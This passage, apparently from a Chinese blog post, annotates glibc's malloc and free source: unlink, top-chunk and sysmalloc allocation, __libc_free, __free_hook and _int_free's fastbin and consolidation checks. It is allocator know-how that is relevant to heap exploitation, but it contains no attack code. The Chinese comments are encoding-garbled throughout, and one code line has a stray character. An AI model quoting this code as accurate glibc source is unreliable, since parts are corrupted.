class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);                                                 \</span><br><span class="line">    <span class="keyword">else</span>                                                                                                                    \</span><br><span class="line">    &#123;                                                                                                                       \</span><br><span class="line">      FD-&gt;bk = BK;                                                                                                          \</span><br><span class="line">      <span class="comment">//å°†å‰åé©±å †å—è¿æ¥,è§£æ”¾P</span></span><br><span class="line">      BK-&gt;fd = FD;                                                                                                          \</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(P-&gt;size) &amp;&amp; __builtin_expect(P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>))                                       \</span><br><span class="line">      &#123;                                                                                                                     \</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) || __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>)) \</span><br><span class="line">          malloc_printerr(check_action,                                                                                     \</span><br><span class="line">                          <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,                                                       \</span><br><span class="line">                          P, AV);                                                                                           \</span><br><span class="line">        <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)                                                                                        \</span><br><span class="line">        &#123;                                                                                                                   \</span><br><span class="line">          <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                                                                          \</span><br><span class="line">            FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                                                                         \</span><br><span class="line">          <span class="keyword">else</span>                                                                                                              \</span><br><span class="line">          &#123;                                                                                                                 \</span><br><span class="line">            FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                               \</span><br><span class="line">            FD-&gt;bk_nextsize </span><br><span class="line">            = P-&gt;bk_nextsize;                                                                               \</span><br><span class="line">            P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                                                                               \</span><br><span class="line">            P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                                                                               \</span><br><span class="line">          &#125;                                                                                                                 \</span><br><span class="line">        &#125;                                                                                                                   \</span><br><span class="line">        <span class="keyword">else</span>                                                                                                                \</span><br><span class="line">        &#123;                                                                                                                   \</span><br><span class="line">          P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                     \</span><br><span class="line">          P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                     \</span><br><span class="line">        &#125;                                                                                                                   \</span><br><span class="line">      &#125;                                                                                                                     \</span><br><span class="line">    &#125;                                                                                                                       \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

















<h5 id="topchunkç”³è¯·"><a href="#topchunkç”³è¯·" class="headerlink" title="topchunkç”³è¯·"></a>topchunkç”³è¯·</h5><p>å¦‚æœè¿˜ä¸è¡Œ,å°è¯•ä½¿ç”¨topchunkåˆ†é…</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h5 id="sysmallocç”³è¯·"><a href="#sysmallocç”³è¯·" class="headerlink" title="sysmallocç”³è¯·"></a>sysmallocç”³è¯·</h5><p>å¦‚æœè¿˜ä¸è¡Œ,å°è¯•sysmalloc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias(__libc_free, __free) strong_alias(__libc_free, free)</span><br></pre></td></tr></table></figure>

<h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__free_hook);<span class="comment">//é¦–å…ˆå°è¯•è°ƒç”¨hookå‡½æ•°(å¦‚æœæœ‰æ³¨å†Œçš„è¯)</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk(mem);<span class="comment">//pæŒ‡å‘å †å—åŸºå€,memæŒ‡å‘æ•°æ®åŒº,ä¹Ÿå°±æ˜¯p+0x10</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      mp_.mmap_threshold = chunksize(p);</span><br><span class="line">      mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">      LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                 mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap_chunk(p);<span class="comment">//å¦‚æœpå †å—æ˜¯mmapåˆ†é…çš„åˆ™è°ƒç”¨munmapé‡Šæ”¾</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk(p);</span><br><span class="line">  _int_free(ar_ptr, p, <span class="number">0</span>);<span class="comment">//è°ƒç”¨glibcå®ç°çš„_int_free,è¿™ä¹Ÿæ˜¯é»˜è®¤é‡Šæ”¾è¿‡ç¨‹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="free-hook"><a href="#free-hook" class="headerlink" title="__free_hook"></a>__free_hook</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span><span class="params">(<span class="type">void</span> *__ptr,<span class="type">const</span> <span class="type">void</span> *)</span> = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>ä¸<code>__malloc_hook</code>åŒç†,å¦‚æœæœ¬é’©å­å‡½æ•°æœ‰æ³¨å†Œè¿‡åˆ™è°ƒç”¨ä¹‹è¿›è¡Œé‡Šæ”¾,ä¸ä¼šå†è°ƒç”¨glibcè‡ªå·±å®ç°çš„<code>_int_free</code></p>
<h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h4><p>å®é™…ä¸Šè°ƒç”¨çš„é‡Šæ”¾å‡½æ•°</p>
<h4 id="ç®—æ³•æµç¨‹-1"><a href="#ç®—æ³•æµç¨‹-1" class="headerlink" title="ç®—æ³•æµç¨‹"></a>ç®—æ³•æµç¨‹</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/free.png" alt="free"></p>
<p>æ•´ä¸ªæµç¨‹è¦æ¯”åˆ†é…<code>_int_malloc</code>ç®€å•ç‚¹</p>
<h4 id="å±€éƒ¨å˜é‡-1"><a href="#å±€éƒ¨å˜é‡-1" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span>		<span class="comment">//ç”¨äºä¿å­˜è¯·æ±‚å †å—çš„æ•´ä½“å¤§å°(åŒ…æ‹¬å…ƒæ•°æ®)</span></span><br><span class="line">mfastbinptr *fb;          <span class="comment">/* associated fastbin */</span>		<span class="comment">//fastbinæ¡¶å­</span></span><br><span class="line">mchunkptr nextchunk;      <span class="comment">/* next contiguous chunk */</span>		<span class="comment">//ä¸‹ä¸€ä¸ªå †å—</span></span><br><span class="line">INTERNAL_SIZE_T nextsize; <span class="comment">/* its size */</span>					<span class="comment">//ä¸‹ä¸€ä¸ªå †å—çš„å¤§å°</span></span><br><span class="line"><span class="type">int</span> nextinuse;            <span class="comment">/* true if nextchunk is used */</span>	<span class="comment">//ä¸‹ä¸€ä¸ªå †å—æ˜¯å¦åœ¨ä½¿ç”¨,åˆå¹¶å †å—æ—¶ç”¨</span></span><br><span class="line">INTERNAL_SIZE_T prevsize; <span class="comment">/* size of previous contiguous chunk */</span>	<span class="comment">//å‰å—å¤§å°</span></span><br><span class="line">mchunkptr bck;            <span class="comment">/* misc temp for linking */</span>		<span class="comment">//å¤´æ’æ³•å‰åé‚»å±…</span></span><br><span class="line">mchunkptr fwd;            <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = chunksize(p);		<span class="comment">//sizeå½“å‰è¦ç”³è¯·çš„å †å—çš„å¤§å°(åŒ…æ‹¬å…ƒæ•°æ®)</span></span><br></pre></td></tr></table></figure>

<h4 id="é‡Šæ”¾å‰æ£€æŸ¥"><a href="#é‡Šæ”¾å‰æ£€æŸ¥" class="headerlink" title="é‡Šæ”¾å‰æ£€æŸ¥"></a>é‡Šæ”¾å‰æ£€æŸ¥</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">   allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">   Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">   here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect((<span class="type">uintptr_t</span>)p &gt; (<span class="type">uintptr_t</span>)-size, <span class="number">0</span>) || __builtin_expect(misaligned_chunk(p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">  <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">  malloc_printerr(check_action, errstr, chunk2mem(p), av);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">   multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p)</span><br></pre></td></tr></table></figure>

<p>æ£€æŸ¥é”å’Œå¯¹é½,æ•´ä¸ªé‡Šæ”¾è¿‡ç¨‹å¯ä»¥çœ‹æˆä¸€ä¸ªäº‹åŠ¡,ç”±é”ä¿è¯ä¸€è‡´æ€§</p>
<h4 id="fastbinåŒºé‡Šæ”¾"><a href="#fastbinåŒºé‡Šæ”¾" class="headerlink" title="fastbinåŒºé‡Šæ”¾"></a>fastbinåŒºé‡Šæ”¾</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast())<span class="comment">//å¦‚æœé‡Šæ”¾å †å—å¤§å°è½åœ¨fastbinèŒƒå›´å†…</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">  If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">  bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<span class="comment">//æ£€æŸ¥åé¢æ˜¯å¦å’Œtopchunkç›¸é‚»,(å¦‚æœç›¸é‚»éœ€è¦åˆå¹¶,ä¸ä¼šè¿›å…¥fastbin)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;<span class="comment">//é¦–å…ˆæ£€æŸ¥å †å—å¤§å°æ˜¯å¦æ¯”æœ€å°å¤§å°è¦å¤§,å¹¶ä¸”æ˜¯ä¸æ˜¯å¯ä»¥åˆ†é…çš„èŒƒå›´å†…</span></span><br><span class="line">      <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">         of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">         after getting the lock.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock || (&#123;c</span><br><span class="line">            assert(locked == <span class="number">0</span>);</span><br><span class="line">            mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">1</span>;</span><br><span class="line">            chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      &#123;</span><br><span class="line">        (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//å·²è·å¾—é”</span></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);<span class="comment">//å †å—çš„memæ•°æ®åŒºæ¸…é›¶</span></span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);<span class="comment">//è®¡ç®—fastbinæ¡¶å­ä¸‹æ ‡</span></span><br><span class="line">    fb = &amp;fastbin(av, idx);<span class="comment">//è·å–fastbinæ¡¶å­å¤´</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;<span class="comment">//oldæŒ‡å‘fastbinå¯¹åº”æ¡¶å­çš„ç¬¬ä¸€ä¸ªå †å—</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">         (i.e., double free).  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))<span class="comment">//æ£€æŸ¥pæ˜¯å¦å·²ç»è¢«åˆšåˆšé‡Šæ”¾è¿‡ä¸€æ¬¡</span></span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">         size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">         only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">         deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">      p-&gt;fd = old2 = old;<span class="comment">//æŠŠpæŒ‚åˆ°fastbinä¸Š(å¤´æ’æ³•),fastbin[idx]-&gt;p-&gt;old-&gt;...</span></span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="å †å—åˆå¹¶"><a href="#å †å—åˆå¹¶" class="headerlink" title="å †å—åˆå¹¶"></a>å †å—åˆå¹¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))<span class="comment">//pä¸èƒ½æ˜¯mmapæ˜ å°„çš„</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);<span class="comment">//å–ç‰©ç†ä¸Šä¸‹ä¸€ä¸ªç›¸é‚»çš„å †å—åŸºåœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top))<span class="comment">//pä¸èƒ½æ˜¯topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption 